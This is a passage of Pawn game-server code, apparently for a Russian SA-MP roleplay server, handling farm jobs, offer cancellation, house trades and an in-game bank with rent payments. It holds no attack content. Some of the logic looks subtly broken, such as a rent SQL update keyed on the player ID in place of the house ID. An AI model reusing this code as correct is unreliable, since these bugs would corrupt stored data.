				FarmStatDay[farm][7] += GetPVarInt(playerid,"farm_zp");
				FarmStatPay[farm][7] += GetPVarInt(playerid,"farm_zp");
				if(GetPVarInt(playerid,"farm_zp") > 0) format(string, 16, "~g~+$%i",GetPVarInt(playerid,"farm_zp")), GameTextForPlayer(playerid, string, 5000, 1);
				FarmInfo[GetPVarInt(playerid,"farm_id")][fBank] -= GetPVarInt(playerid,"farm_zp");
				if(FarmInfo[GetPVarInt(playerid,"farm_id")][fBank] < 0) FarmInfo[GetPVarInt(playerid,"farm_id")][fBank] = 0;
				SetPlayerSkin(playerid,PlayerInfo[playerid][pChar][0]);
				DisablePlayerCheckpoint(playerid);
				DisablePlayerRaceCheckpoint(playerid);
				RemovePlayerAttachedObject(playerid,3);
				DeletePVar(playerid,"farm_id");
				DeletePVar(playerid,"farm_status");
				DeletePVar(playerid,"farm_rank");
				DeletePVar(playerid,"farm_zp");
				SCM(playerid,COLOR_GREEN," Спасибо за работу, приходите еще!");
			}
			return true;
		}
	case 1757:
		{
			if(!response) return true;
			switch(listitem)
			{
			case 0:
				{
					if(!GetPVarInt(playerid,"Offer")) return SCM(playerid,COLOR_GREY," Вы не предлагали купить нарко");
					DrugOffer[GetPVarInt(playerid,"Offer")] = 999;
					DrugPrice[GetPVarInt(playerid,"Offer")] = 999;
					DrugGram[GetPVarInt(playerid,"Offer")] = 999;
					DeletePVar(playerid,"Offer");
				}
			case 1:
				{
					if(!GetPVarInt(playerid,"RepairOffer")) return SCM(playerid,COLOR_GREY," Вы не предлагали никому ремонт");
					RepairOffer[GetPVarInt(playerid,"RepairOffer")] = 999;
					RepairPrice[GetPVarInt(playerid,"RepairOffer")] = 999;
					DeletePVar(playerid,"RepairOffer");
				}
			case 2:
				{
					if(!GetPVarInt(playerid,"RefillOffer")) return SCM(playerid,COLOR_GREY," Вы не предлагали никому заправиться");
					RefillOffer[GetPVarInt(playerid,"RefillOffer")] = 999;
					RefillPrice[GetPVarInt(playerid,"RefillOffer")] = 999;
					DeletePVar(playerid,"RefillOffer");
				}
			case 3:
				{
					if(!GetPVarInt(playerid,"LiveOffer")) return SCM(playerid,COLOR_GREY," Вы не предлагали никому интервью");
					switch(PlayerInfo[playerid][pMember])
					{
					case 9: LiveOffer[GetPVarInt(playerid,"LiveOffer")] = 999;
					case 16: LiveOfferls[GetPVarInt(playerid,"LiveOffer")] = 999;
					case 20: LiveOfferlv[GetPVarInt(playerid,"LiveOffer")] = 999;
					}
					DeletePVar(playerid,"LiveOffer");
				}
			case 4:
				{
					if(updatecheck[playerid] == 9999) return SCM(playerid,COLOR_GREY," Принятых вызовов нет");
					updatecheck[playerid] = 9999;
				}
			case 5:
				{
					if(updatecheck[playerid] == 9999) return SCM(playerid,COLOR_GREY," Принятых вызовов нет");
					updatecheck[playerid] = 9999;
				}
			case 6:
				{
					if(updatecheck[playerid] == 9999) return SCM(playerid,COLOR_GREY," Принятых вызовов нет");
					updatecheck[playerid] = 9999;
				}
			case 7:
				{
					if(updatecheck[playerid] == 9999) return SCM(playerid,COLOR_GREY," Принятых вызовов нет");
					updatecheck[playerid] = 9999;
				}
			case 8:
				{
					if(GetPVarInt(playerid,"CarOffer") == 9999) return SCM(playerid,COLOR_GREY," Вы не предлагали никому обмен авто");
					CarOffer[GetPVarInt(playerid,"CarOffer")] = 999;
					CarPrice[GetPVarInt(playerid,"CarOffer")] = 999;
					SetPVarInt(playerid,"CarOffer",9999);
				}
			case 9:
				{
					if(timecar[playerid] < 1) return SCM(playerid,COLOR_GREY," Вы не начинали миссию автоугона");
					if(caroff[GetPlayerVehicleID(playerid)] == 1) caroff[GetPlayerVehicleID(playerid)] = 0, DestroyVehicle(GetPlayerVehicleID(playerid));
					timecar[playerid] = 0;
					if(PlayerInfo[playerid][pSkilla] > 0) PlayerInfo[playerid][pSkilla]--;
					SCM(playerid, COLOR_BLUE, " [SMS]: Ты нас разочаровал! Миссия провалена");
					avtocar[playerid] = 0;
					rabotaon[playerid] = 0;
					GangZoneDestroy(gangzonesa[playerid]);
				}
			case 10:
				{
					if(DiceOffers[playerid] != 999)
					{
						SendMes(playerid, COLOR_ORANGE, " Вы отказались играть в кости с %s",PlayerInfo[DiceOffers[playerid]][pName]);
						SendMes(DiceOffers[playerid], COLOR_ORANGE, " %s отказался играть с вами в кости",PlayerInfo[playerid][pName]);
						ZapretDice[playerid] = 0;
						ZapretDice[DiceOffers[playerid]] = 0;
						KostiMoney[DiceOffers[playerid]] = 0;
						KostiName[DiceOffers[playerid]] = 999;
						DiceOffers[playerid] = 999;
					}
					else return SCM(playerid,COLOR_GREY," Вы не предлогали не кому играть");
				}
			}
			GameTextForPlayer(playerid,"~r~cancelled", 3500, 1);
			return true;
		}
	case 1565:
		{
			new i = GetPVarInt(playerid,"_changehouse")-1;
			if(!GetPVarInt(playerid,"_changehouse")) return true;
			if(!response) return SCM(playerid,COLOR_GREY," Вы отказались от сделки"), SCM(i,COLOR_GREY," Игрок отказался от сделки"), DeletePVar(i,"changehouse"), DeletePVar(i,"changehouse_price"), DeletePVar(i,"changehouse_"), DeletePVar(playerid,"_changehouse");
			if(!HGet(i)) return SCM(playerid,COLOR_GREY," У игрока нет дома!"), DeletePVar(i,"changehouse"), DeletePVar(i,"changehouse_price"), DeletePVar(i,"changehouse_"), DeletePVar(playerid,"_changehouse");
			new h = PlayerInfo[i][pPHouseKey];
			if(!ProxDetectorS(8.0, playerid, i)) return SCM(playerid, COLOR_GREY, " Игрок слишком далеко от вас!"), DeletePVar(i,"changehouse"), DeletePVar(i,"changehouse_price"), DeletePVar(i,"changehouse_"), DeletePVar(playerid,"_changehouse");
			if(PlayerInfo[playerid][pCash] < GetPVarInt(i,"changehouse_price"))return SCM(playerid, COLOR_GREY, " У вас нет столько денег на руках!"), DeletePVar(i,"changehouse"), DeletePVar(i,"changehouse_price"), DeletePVar(i,"changehouse_"), DeletePVar(playerid,"_changehouse");
			if(GetPVarInt(playerid,"changehouse_h"))
			{
				if(!HGet(playerid)) return SCM(playerid,COLOR_GREY," У вас нет дома!"), DeletePVar(i,"changehouse"), DeletePVar(i,"changehouse_price"), DeletePVar(i,"changehouse_"), DeletePVar(playerid,"_changehouse");
				strmid(HouseInfo[PlayerInfo[playerid][pPHouseKey]][hOwner],PlayerInfo[i][pName], 0, strlen(PlayerInfo[i][pName]), 32);
				SendMes(playerid,0x6495EDFF," Вы обменялись домами с %s. Ваша доплата %i вирт!",PlayerInfo[i][pName], GetPVarInt(i,"changehouse_price"));
				SendMes(i,0x6495EDFF," Вы обменялись домами с %s. Доплата %i вирт!",PlayerInfo[playerid][pName], GetPVarInt(i,"changehouse_price"));
				BuyHouse(PlayerInfo[playerid][pPHouseKey]);
				printf("Игрок %s обменялся домами с %s", Name(playerid), Name(i));
			}
			else SendMes(playerid,0x6495EDFF," Вы купили дом у %s. Стоимость %i вирт!",PlayerInfo[i][pName], GetPVarInt(i,"changehouse_price")), SendMes(i,0x6495EDFF," Вы продали дом %s. Стоимость %i вирт!",PlayerInfo[playerid][pName], GetPVarInt(i,"changehouse_price"));
			strmid(HouseInfo[h][hOwner],PlayerInfo[playerid][pName], 0, strlen(PlayerInfo[playerid][pName]), 32);
			if(house_car[i] != -1 && !HGet(i)) DestroyVehicle(house_car[i]), house_car[i] = -1;
			PlayerInfo[playerid][pCash] -= GetPVarInt(i,"changehouse_price");
			PlayerInfo[i][pCash] += GetPVarInt(i,"changehouse_price");
			BuyHouse(h);
			HGet(i), HGet(playerid);
			DeletePVar(i,"changehouse");
			DeletePVar(i,"changehouse_price");
			DeletePVar(i,"changehouse_");
			return DeletePVar(playerid,"_changehouse");
		}
	case 1467:
		{
			if(!response)
			{
				if(GetPVarInt(playerid,"help_dialog") > 1) return ShowHelpDialog(playerid, 0);
				else return SetPVarInt(playerid,"help_dialog",0);
			}
			else if(!GetPVarInt(playerid,"help_dialog")) return ShowHelpDialog(playerid, 0);
			else if(GetPVarInt(playerid,"help_dialog") == 1) ShowHelpDialog(playerid, listitem+1);
			else if(GetPVarInt(playerid,"help_dialog") > 1) ShowHelpDialog(playerid, GetPVarInt(playerid,"help_dialog")-1);
			return true;
		}
	case 1755:
		{
			if(!response) return true;
			string = "";
			for(new i = 1; i <= TotalBizz; i++)
			{
				if(BizzInfo[i][bType] != listitem+1) continue;
				format(YCMDstr,128,"{FFFFFF}%s {0076FC}%i вирт\n",BizzInfo[i][bMessage], BizzInfo[i][bPrice]);
				strcat(string,YCMDstr);
			}
			return ShowPlayerDialogEx(playerid,0,DIALOG_STYLE_MSGBOX,"Мониторинг бизнесов",string, "Закрыть", "");
		}
 	case 9666:
		{
			if(!response) return GameTextForPlayer(playerid,"~g~good luck",1000,1);
			switch(listitem)
			{
   			case 0:
			{
			    format(string, 300, "{FFFFFF}[0] Баланс: $%i\n\
				[1] Снять со счёта\n\
				[2] Положить на счёт\n\
				[3] Оплатить кварплату наличными\n\
				[4] Оплатить кварплату со счёта\n\
				[5] Перевести игроку с наличных\n\
				[6] Перевести игроку со счёта", PlayerInfo[playerid][pBank]);
				ShowPlayerDialogEx(playerid, 9666, DIALOG_STYLE_LIST, "{FFFFFF}Меню | {AE433D}Банк", string, "Далее", "Выйти");
				return true;
			}
			case 1: return ShowPlayerDialogEx(playerid, 9661, DIALOG_STYLE_INPUT, "{FFFFFF}Снять со счёта | {AE433D}Банк","{FFFFFF}Введите сумму, которую хотите снять с личного счёта:", "Выбрать", "Назад");
			case 2: return ShowPlayerDialogEx(playerid, 9662, DIALOG_STYLE_INPUT, "{FFFFFF}Положить на счёт | {AE433D}Банк","{FFFFFF}Введите сумму, которую хотите положить на личный счёт:", "Выбрать", "Назад");
			case 3:
			{
				    if(!HGet(playerid))
					{
					    SCM(playerid,COLOR_GREY," У вас отсутствует частное имущество");
					    format(string, 300, "{FFFFFF}[0] Баланс: $%i\n\
						[1] Снять со счёта\n\
						[2] Положить на счёт\n\
						[3] Оплатить кварплату наличными\n\
						[4] Оплатить кварплату со счёта\n\
						[5] Перевести игроку с наличных\n\
						[6] Перевести игроку со счёта", PlayerInfo[playerid][pBank]);
						ShowPlayerDialogEx(playerid, 9666, DIALOG_STYLE_LIST, "{FFFFFF}Меню | {AE433D}Банк", string, "Далее", "Выйти");
						return true;
					}
					format(string,512,"[0] 1 час\t\t\t\t\t%i вирт\n[1] 3 часа\t\t\t\t\t%i вирт\n[2] 5 часов\t\t\t\t\t%i вирт\n[3] 12 часов\t\t\t\t\t%i вирт\n[4] 24 часа\t\t\t\t\t%i вирт\n[5] 3 дня\t\t\t\t\t%i вирт\n[6] 7 дней\t\t\t\t\t%i вирт\n[7] 14 дней\t\t\t\t\t%i вирт\n[8] 28 дней\t\t\t\t\t%i вирт",
					GetHouseOplata(PlayerInfo[playerid][pPHouseKey]),GetHouseOplata(PlayerInfo[playerid][pPHouseKey])*3,GetHouseOplata(PlayerInfo[playerid][pPHouseKey])*5,GetHouseOplata(PlayerInfo[playerid][pPHouseKey])*12,GetHouseOplata(PlayerInfo[playerid][pPHouseKey])*24,GetHouseOplata(PlayerInfo[playerid][pPHouseKey])*72,GetHouseOplata(PlayerInfo[playerid][pPHouseKey])*168,GetHouseOplata(PlayerInfo[playerid][pPHouseKey])*336,GetHouseOplata(PlayerInfo[playerid][pPHouseKey])*672);
					ShowPlayerDialogEx(playerid,9663,DIALOG_STYLE_LIST, "{FFFFFF}Оплатить квартплату наличными | {AE433D}Банк",string, "Выбрать", "Назад");
             }
			 case 4:
			 {
                if(!HGet(playerid))
				{
				    SCM(playerid,COLOR_GREY," У вас отсутствует частное имущество");
				    format(string, 300, "{FFFFFF}[0] Баланс: $%i\n\
					[1] Снять со счёта\n\
					[2] Положить на счёт\n\
					[3] Оплатить кварплату наличными\n\
					[4] Оплатить кварплату со счёта\n\
					[5] Перевести игроку с наличных\n\
					[6] Перевести игроку со счёта", PlayerInfo[playerid][pBank]);
					ShowPlayerDialogEx(playerid, 9666, DIALOG_STYLE_LIST, "{FFFFFF}Меню | {AE433D}Банк", string, "Далее", "Выйти");
					return true;
				}
				format(string,512,"[0] 1 час\t\t\t\t\t%i вирт\n[1] 3 часа\t\t\t\t\t%i вирт\n[2] 5 часов\t\t\t\t\t%i вирт\n[3] 12 часов\t\t\t\t\t%i вирт\n[4] 24 часа\t\t\t\t\t%i вирт\n[5] 3 дня\t\t\t\t\t%i вирт\n[6] 7 дней\t\t\t\t\t%i вирт\n[7] 14 дней\t\t\t\t\t%i вирт\n[8] 28 дней\t\t\t\t\t%i вирт",
				GetHouseOplata(PlayerInfo[playerid][pPHouseKey]),GetHouseOplata(PlayerInfo[playerid][pPHouseKey])*3,GetHouseOplata(PlayerInfo[playerid][pPHouseKey])*5,GetHouseOplata(PlayerInfo[playerid][pPHouseKey])*12,GetHouseOplata(PlayerInfo[playerid][pPHouseKey])*24,GetHouseOplata(PlayerInfo[playerid][pPHouseKey])*72,GetHouseOplata(PlayerInfo[playerid][pPHouseKey])*168,GetHouseOplata(PlayerInfo[playerid][pPHouseKey])*336,GetHouseOplata(PlayerInfo[playerid][pPHouseKey])*672);
                ShowPlayerDialogEx(playerid,9664,DIALOG_STYLE_LIST, "{FFFFFF}Оплатить квартплату банком | {AE433D}Банк",string, "Выбрать", "Назад");
			 }
			 case 5: return ShowPlayerDialogEx(playerid, 9665, DIALOG_STYLE_INPUT, "{FFFFFF}Перевести игроку с наличных | {AE433D}Банк","{FFFFFF}Введите сумму, которую хотите передать и имя игрока через пробел\n\nПример: ''212121 Ioan_Grozny''", "Выбрать", "Назад");
			 case 6: return ShowPlayerDialogEx(playerid, 9667, DIALOG_STYLE_INPUT, "{FFFFFF}Перевести игроку со счёта | {AE433D}Банк","{FFFFFF}Введите сумму, которую хотите передать и имя игрока через пробел\n\nПример: ''212121 Ioan_Grozny''", "Выбрать", "Назад");
			}
		}
	case 9661:
		{
			if(!response)
			{
                format(string, 300, "{FFFFFF}[0] Баланс: $%i\n\
				[1] Снять со счёта\n\
				[2] Положить на счёт\n\
				[3] Оплатить кварплату наличными\n\
				[4] Оплатить кварплату со счёта\n\
				[5] Перевести игроку с наличных\n\
				[6] Перевести игроку со счёта", PlayerInfo[playerid][pBank]);
				ShowPlayerDialogEx(playerid, 9666, DIALOG_STYLE_LIST, "{FFFFFF}Меню | {AE433D}Банк", string, "Далее", "Выйти");
				return true;
			}
            if(!(1 <= strval(inputtext) <= 99999999999)) return ShowPlayerDialogEx(playerid, 8905, DIALOG_STYLE_INPUT, "{FFFFFF}Снять со счёта | {AE433D}Банк","{FFFFFF}Введите сумму, которую хотите снять с личного счёта:", "Выбрать", "Назад");
			if(PlayerInfo[playerid][pBank] < strval(inputtext))
			{
                SCM(playerid,COLOR_GREY," Недостаточно средств на банковском счету");
                format(string, 300, "{FFFFFF}[0] Баланс: $%i\n\
				[1] Снять со счёта\n\
				[2] Положить на счёт\n\
				[3] Оплатить кварплату наличными\n\
				[4] Оплатить кварплату со счёта\n\
				[5] Перевести игроку с наличных\n\
				[6] Перевести игроку со счёта", PlayerInfo[playerid][pBank]);
				ShowPlayerDialogEx(playerid, 9666, DIALOG_STYLE_LIST, "{FFFFFF}Меню | {AE433D}Банк", string, "Далее", "Выйти");
				return true;
			}
			PlayerInfo[playerid][pBank]-=strval(inputtext);
			PlayerInfo[playerid][pCash]+=strval(inputtext);
			format(string,15,"~b~+$%i",strval(inputtext));
			GameTextForPlayer(playerid,string,1000,1);
			SendMes(playerid,0x6495edff," Вы сняли со счета %i вирт. Баланс: %i вирт",strval(inputtext),PlayerInfo[playerid][pBank]);
			PlayerPlaySound(playerid, 1052, 0.0, 0.0, 0.0);
			mysql_format(DATABASE,QUERY,300, "UPDATE `"TABLE_ACCOUNTS"` SET pBank = '%i', pCash = '%i'WHERE name = '%e'", PlayerInfo[playerid][pBank], PlayerInfo[playerid][pCash], PlayerInfo[playerid][pName]);
            mysql_function_query(DATABASE,QUERY,false,"","");
			return ShowPlayerDialogEx(playerid, 9661, DIALOG_STYLE_INPUT, "{FFFFFF}Снять со счёта | {AE433D}Банк","{FFFFFF}Введите сумму, которую хотите снять с личного счёта:", "Выбрать", "Назад");
		}
	case 9662:
		{
			if(!response)
			{
                format(string, 300, "{FFFFFF}[0] Баланс: $%i\n\
				[1] Снять со счёта\n\
				[2] Положить на счёт\n\
				[3] Оплатить кварплату наличными\n\
				[4] Оплатить кварплату со счёта\n\
				[5] Перевести игроку с наличных\n\
				[6] Перевести игроку со счёта", PlayerInfo[playerid][pBank]);
				ShowPlayerDialogEx(playerid, 9666, DIALOG_STYLE_LIST, "{FFFFFF}Меню | {AE433D}Банк", string, "Далее", "Выйти");
				return true;
			}
		    if(!(1 <= strval(inputtext) <= 99999999999)) return ShowPlayerDialogEx(playerid, 9662, DIALOG_STYLE_INPUT, "{FFFFFF}Положить на счёт | {AE433D}Банк","{FFFFFF}Введите сумму которую хотите положить на личный счёт:", "Выбрать", "Назад");
            if(!strlen(inputtext)) return ShowPlayerDialogEx(playerid, 9662, DIALOG_STYLE_INPUT, "{FFFFFF}Положить на счёт | {AE433D}Банк","{FFFFFF}Введите сумму которую хотите положить на личный счёт:", "Выбрать", "Назад");
			if(PlayerInfo[playerid][pCash] < strval(inputtext))
			{
			    SCM(playerid,COLOR_GREY," Недостаточно средств на руках");
                format(string, 300, "{FFFFFF}[0] Баланс: $%i\n\
				[1] Снять со счёта\n\
				[2] Положить на счёт\n\
				[3] Оплатить кварплату наличными\n\
				[4] Оплатить кварплату со счёта\n\
				[5] Перевести игроку с наличных\n\
				[6] Перевести игроку со счёта", PlayerInfo[playerid][pBank]);
				ShowPlayerDialogEx(playerid, 9666, DIALOG_STYLE_LIST, "{FFFFFF}Меню | {AE433D}Банк", string, "Далее", "Выйти");
				return true;
			}
			PlayerInfo[playerid][pCash]-=strval(inputtext);
			PlayerInfo[playerid][pBank]+=strval(inputtext);
			format(string,15,"~r~-$%i",strval(inputtext));
			GameTextForPlayer(playerid,string,1000,1);
			SendMes(playerid,0x6495EDFF," Вы пополнили счет на %i вирт. Баланс: %i вирт",strval(inputtext),PlayerInfo[playerid][pBank]);
			PlayerPlaySound(playerid, 1052, 0.0, 0.0, 0.0);
			mysql_format(DATABASE,QUERY,300, "UPDATE `"TABLE_ACCOUNTS"` SET pCash = '%i', pBank = '%i'WHERE name = '%e'", PlayerInfo[playerid][pCash], PlayerInfo[playerid][pBank], PlayerInfo[playerid][pName]);
            mysql_function_query(DATABASE,QUERY,false,"","");
			return ShowPlayerDialogEx(playerid, 9662, DIALOG_STYLE_INPUT, "{FFFFFF}Положить на счёт | {AE433D}Банк","{FFFFFF}Введите сумму которую хотите положить на личный счёт:", "Выбрать", "Назад");
		}
	case 9663:
		{
		    if(!response)
			{
                format(string, 300, "{FFFFFF}[0] Баланс: $%i\n\
				[1] Снять со счёта\n\
				[2] Положить на счёт\n\
				[3] Оплатить кварплату наличными\n\
				[4] Оплатить кварплату со счёта\n\
				[5] Перевести игроку с наличных\n\
				[6] Перевести игроку со счёта", PlayerInfo[playerid][pBank]);
				ShowPlayerDialogEx(playerid, 9666, DIALOG_STYLE_LIST, "{FFFFFF}Меню | {AE433D}Банк", string, "Далее", "Выйти");
				return true;
			}
			if(!HGet(playerid))
			{
			    SCM(playerid,COLOR_GREY," У вас отсутствует частное имущество");
                format(string, 300, "{FFFFFF}[0] Баланс: $%i\n\
				[1] Снять со счёта\n\
				[2] Положить на счёт\n\
				[3] Оплатить кварплату наличными\n\
				[4] Оплатить кварплату со счёта\n\
				[5] Перевести игроку с наличных\n\
				[6] Перевести игроку со счёта", PlayerInfo[playerid][pBank]);
				ShowPlayerDialogEx(playerid, 9666, DIALOG_STYLE_LIST, "{FFFFFF}Меню | {AE433D}Банк", string, "Далее", "Выйти");
				return true;
			}
			switch(listitem)
			{
			case 0: SetPVarInt(playerid,"Housemoney",1);
			case 1: SetPVarInt(playerid,"Housemoney",3);
			case 2: SetPVarInt(playerid,"Housemoney",5);
			case 3: SetPVarInt(playerid,"Housemoney",12);
			case 4: SetPVarInt(playerid,"Housemoney",24);
			case 5: SetPVarInt(playerid,"Housemoney",72);
			case 6: SetPVarInt(playerid,"Housemoney",168);
			case 7: SetPVarInt(playerid,"Housemoney",336);
			case 8: SetPVarInt(playerid,"Housemoney",672);
			}
			new moneys = (GetPVarInt(playerid,"Housemoney")*GetHouseOplata(PlayerInfo[playerid][pPHouseKey]));
			if(PlayerInfo[playerid][pCash] < moneys)
			{
			    SCM(playerid,COLOR_GREY," Недостаточно средств на руках");
                format(string, 300, "{FFFFFF}[0] Баланс: $%i\n\
				[1] Снять со счёта\n\
				[2] Положить на счёт\n\
				[3] Оплатить кварплату наличными\n\
				[4] Оплатить кварплату со счёта\n\
				[5] Перевести игроку с наличных\n\
				[6] Перевести игроку со счёта", PlayerInfo[playerid][pBank]);
				ShowPlayerDialogEx(playerid, 9666, DIALOG_STYLE_LIST, "{FFFFFF}Меню | {AE433D}Банк", string, "Далее", "Выйти");
				return true;
			}
			if(HouseInfo[PlayerInfo[playerid][pPHouseKey]][hTakings]+moneys > GetHouseOplata(PlayerInfo[playerid][pPHouseKey])*672+1) {
			SendMes(playerid,COLOR_GREY," Вы не можете пополнить домашний счет выше, чем на %i вирт. Ваш баланс: %i вирт",GetHouseOplata(PlayerInfo[playerid][pPHouseKey])*672,HouseInfo[PlayerInfo[playerid][pPHouseKey]][hTakings]);
			format(string,512,"[0] 1 час\t\t\t\t\t%i вирт\n[1] 3 часа\t\t\t\t\t%i вирт\n[2] 5 часов\t\t\t\t\t%i вирт\n[3] 12 часов\t\t\t\t\t%i вирт\n[4] 24 часа\t\t\t\t\t%i вирт\n[5] 3 дня\t\t\t\t\t%i вирт\n[1] 7 дней\t\t\t\t\t%i вирт\n[1] 14 дней\t\t\t\t\t%i вирт\n[1] 28 дней\t\t\t\t\t%i вирт",
			GetHouseOplata(PlayerInfo[playerid][pPHouseKey]),GetHouseOplata(PlayerInfo[playerid][pPHouseKey])*3,GetHouseOplata(PlayerInfo[playerid][pPHouseKey])*5,GetHouseOplata(PlayerInfo[playerid][pPHouseKey])*12,GetHouseOplata(PlayerInfo[playerid][pPHouseKey])*24,GetHouseOplata(PlayerInfo[playerid][pPHouseKey])*72,GetHouseOplata(PlayerInfo[playerid][pPHouseKey])*168,GetHouseOplata(PlayerInfo[playerid][pPHouseKey])*336,GetHouseOplata(PlayerInfo[playerid][pPHouseKey])*672);
			ShowPlayerDialogEx(playerid,9663,DIALOG_STYLE_LIST, "{FFFFFF}Оплатить квартплату наличными | {AE433D}Банк",string, "Выбрать", "Назад"); return true;}
			HouseInfo[PlayerInfo[playerid][pPHouseKey]][hTakings]+=moneys;
			PlayerInfo[playerid][pCash]-= moneys;
			FracBank[0][fKazna]+=moneys/2;
			SendMes(playerid,COLOR_BLUE," Вы перевели наличными %i вирт. Остаток: %i вирт. Домашний счёт %i вирт",moneys,PlayerInfo[playerid][pCash],HouseInfo[PlayerInfo[playerid][pPHouseKey]][hTakings]);
			format(string,512,"[0] 1 час\t\t\t\t\t%i вирт\n[1] 3 часа\t\t\t\t\t%i вирт\n[2] 5 часов\t\t\t\t\t%i вирт\n[3] 12 часов\t\t\t\t\t%i вирт\n[4] 24 часа\t\t\t\t\t%i вирт\n[5] 3 дня\t\t\t\t\t%i вирт\n[6] 7 дней\t\t\t\t\t%i вирт\n[7] 14 дней\t\t\t\t\t%i вирт\n[8] 28 дней\t\t\t\t\t%i вирт",
			GetHouseOplata(PlayerInfo[playerid][pPHouseKey]),GetHouseOplata(PlayerInfo[playerid][pPHouseKey])*3,GetHouseOplata(PlayerInfo[playerid][pPHouseKey])*5,GetHouseOplata(PlayerInfo[playerid][pPHouseKey])*12,GetHouseOplata(PlayerInfo[playerid][pPHouseKey])*24,GetHouseOplata(PlayerInfo[playerid][pPHouseKey])*72,GetHouseOplata(PlayerInfo[playerid][pPHouseKey])*168,GetHouseOplata(PlayerInfo[playerid][pPHouseKey])*336,GetHouseOplata(PlayerInfo[playerid][pPHouseKey])*672);
			ShowPlayerDialogEx(playerid,9663,DIALOG_STYLE_LIST, "{FFFFFF}Оплатить квартплату наличными | {AE433D}Банк",string, "Выбрать", "Назад");
			PlayerPlaySound(playerid, 1052, 0.0, 0.0, 0.0);
			DeletePVar(playerid,"Housemoney");

			mysql_format(DATABASE,QUERY,300, "UPDATE `"TABLE_HOUSE"` SET hTakings = '%i' WHERE hID = '%d'", HouseInfo[PlayerInfo[playerid][pPHouseKey]][hTakings], playerid);
            mysql_function_query(DATABASE,QUERY,false,"","");

			mysql_format(DATABASE,QUERY,300, "UPDATE `"TABLE_ACCOUNTS"` SET pCash = '%i' WHERE name = '%e'", PlayerInfo[playerid][pCash], PlayerInfo[playerid][pName]);
            mysql_function_query(DATABASE,QUERY,false,"","");
		}
     case 9664:
		{
		    if(!response)
			{
                format(string, 300, "{FFFFFF}[0] Баланс: $%i\n\
				[1] Снять со счёта\n\
				[2] Положить на счёт\n\
				[3] Оплатить кварплату наличными\n\
				[4] Оплатить кварплату со счёта\n\
				[5] Перевести игроку с наличных\n\
				[6] Перевести игроку со счёта", PlayerInfo[playerid][pBank]);
				ShowPlayerDialogEx(playerid, 9666, DIALOG_STYLE_LIST, "{FFFFFF}Меню | {AE433D}Банк", string, "Далее", "Выйти");
				return true;
			}
			if(!HGet(playerid))
			{
			    SCM(playerid,COLOR_GREY," У вас отсутствует частное имущество");
                format(string, 300, "{FFFFFF}[0] Баланс: $%i\n\
				[1] Снять со счёта\n\
				[2] Положить на счёт\n\
				[3] Оплатить кварплату наличными\n\
				[4] Оплатить кварплату со счёта\n\
				[5] Перевести игроку с наличных\n\
				[6] Перевести игроку со счёта", PlayerInfo[playerid][pBank]);
				ShowPlayerDialogEx(playerid, 9666, DIALOG_STYLE_LIST, "{FFFFFF}Меню | {AE433D}Банк", string, "Далее", "Выйти");
				return true;
			}
			switch(listitem)
			{
			case 0: SetPVarInt(playerid,"Housemoney",1);
			case 1: SetPVarInt(playerid,"Housemoney",3);
			case 2: SetPVarInt(playerid,"Housemoney",5);
			case 3: SetPVarInt(playerid,"Housemoney",12);
			case 4: SetPVarInt(playerid,"Housemoney",24);
			case 5: SetPVarInt(playerid,"Housemoney",72);
			case 6: SetPVarInt(playerid,"Housemoney",168);
			case 7: SetPVarInt(playerid,"Housemoney",336);
			case 8: SetPVarInt(playerid,"Housemoney",672);
			}
			new moneys = (GetPVarInt(playerid,"Housemoney")*GetHouseOplata(PlayerInfo[playerid][pPHouseKey]));
			if(PlayerInfo[playerid][pBank] < moneys)
			{
			    SCM(playerid,COLOR_GREY," Недостаточно средств на банковском счету");
                format(string, 300, "{FFFFFF}[0] Баланс: $%i\n\
				[1] Снять со счёта\n\
				[2] Положить на счёт\n\
				[3] Оплатить кварплату наличными\n\
				[4] Оплатить кварплату со счёта\n\
				[5] Перевести игроку с наличных\n\
				[6] Перевести игроку со счёта", PlayerInfo[playerid][pBank]);
				ShowPlayerDialogEx(playerid, 9666, DIALOG_STYLE_LIST, "{FFFFFF}Меню | {AE433D}Банк", string, "Далее", "Выйти");
				return true;
			}
			if(HouseInfo[PlayerInfo[playerid][pPHouseKey]][hTakings]+moneys > GetHouseOplata(PlayerInfo[playerid][pPHouseKey])*672+1) {
			SendMes(playerid,COLOR_GREY," Вы не можете пополнить домашний счет выше, чем на %i вирт. Ваш баланс: %i вирт",GetHouseOplata(PlayerInfo[playerid][pPHouseKey])*672,HouseInfo[PlayerInfo[playerid][pPHouseKey]][hTakings]);
			format(string,512,"[0] 1 час\t\t\t\t\t%i вирт\n[1] 3 часа\t\t\t\t\t%i вирт\n[2] 5 часов\t\t\t\t\t%i вирт\n[3] 12 часов\t\t\t\t\t%i вирт\n[4] 24 часа\t\t\t\t\t%i вирт\n[5] 3 дня\t\t\t\t\t%i вирт\n[1] 7 дней\t\t\t\t\t%i вирт\n[1] 14 дней\t\t\t\t\t%i вирт\n[1] 28 дней\t\t\t\t\t%i вирт",
			GetHouseOplata(PlayerInfo[playerid][pPHouseKey]),GetHouseOplata(PlayerInfo[playerid][pPHouseKey])*3,GetHouseOplata(PlayerInfo[playerid][pPHouseKey])*5,GetHouseOplata(PlayerInfo[playerid][pPHouseKey])*12,GetHouseOplata(PlayerInfo[playerid][pPHouseKey])*24,GetHouseOplata(PlayerInfo[playerid][pPHouseKey])*72,GetHouseOplata(PlayerInfo[playerid][pPHouseKey])*168,GetHouseOplata(PlayerInfo[playerid][pPHouseKey])*336,GetHouseOplata(PlayerInfo[playerid][pPHouseKey])*672);
			ShowPlayerDialogEx(playerid,9664,DIALOG_STYLE_LIST, "{FFFFFF}Оплатить квартплату банком | {AE433D}Банк",string, "Выбрать", "Назад"); return true;}
			HouseInfo[PlayerInfo[playerid][pPHouseKey]][hTakings]+=moneys;
			PlayerInfo[playerid][pBank]-= moneys;
			FracBank[0][fKazna]+=moneys/2;
			SendMes(playerid,COLOR_BLUE," Вы перевели банком %i вирт. Остаток: %i вирт. Домашний счёт %i вирт",moneys,PlayerInfo[playerid][pBank],HouseInfo[PlayerInfo[playerid][pPHouseKey]][hTakings]);
			format(string,512,"[0] 1 час\t\t\t\t\t%i вирт\n[1] 3 часа\t\t\t\t\t%i вирт\n[2] 5 часов\t\t\t\t\t%i вирт\n[3] 12 часов\t\t\t\t\t%i вирт\n[4] 24 часа\t\t\t\t\t%i вирт\n[5] 3 дня\t\t\t\t\t%i вирт\n[6] 7 дней\t\t\t\t\t%i вирт\n[7] 14 дней\t\t\t\t\t%i вирт\n[8] 28 дней\t\t\t\t\t%i вирт",
